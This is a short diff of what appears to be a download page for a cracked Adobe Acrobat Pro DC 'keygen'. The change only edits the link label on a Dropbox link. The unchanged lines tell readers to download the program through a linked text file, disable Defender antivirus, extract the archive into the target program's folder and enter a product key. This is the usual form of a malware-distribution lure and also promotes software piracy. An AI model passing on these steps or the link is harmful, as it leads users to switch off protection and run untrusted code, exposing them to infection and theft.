@@ -16,4 +16,4 @@ Download the program by following the link provided in the text file.
 Disable Defender antivirus protection.
 Extract the contents of the archive into the folder containing the program you want to unlock.
 Enter the Registration Code and Product Key when prompted.
-[🔗 Download Adobe Acrobat Pro DC Keygen](https://www.dropbox.com/scl/fi/7w1ze5i4h82nvtgbdpahl/link.txt?rlkey=8qa6sedog89xjf32p4iv26af7&st=oh1vmrnm&dl=1)
+[🔗 Download ](https://www.dropbox.com/scl/fi/7w1ze5i4h82nvtgbdpahl/link.txt?rlkey=8qa6sedog89xjf32p4iv26af7&st=oh1vmrnm&dl=1)
